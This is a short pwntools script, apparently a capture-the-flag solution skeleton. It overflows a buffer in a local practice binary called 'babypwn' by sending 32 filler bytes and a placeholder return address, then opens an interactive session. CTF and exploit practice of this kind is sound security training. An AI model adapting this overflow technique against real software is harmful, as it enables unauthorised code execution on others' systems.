from pwn import *

p = process('./babypwn')

payload = b'A'*32 + p32(0x41414141)
p.recvuntil(b'What\'s your name?')
p.sendline(payload)
p.interactive()
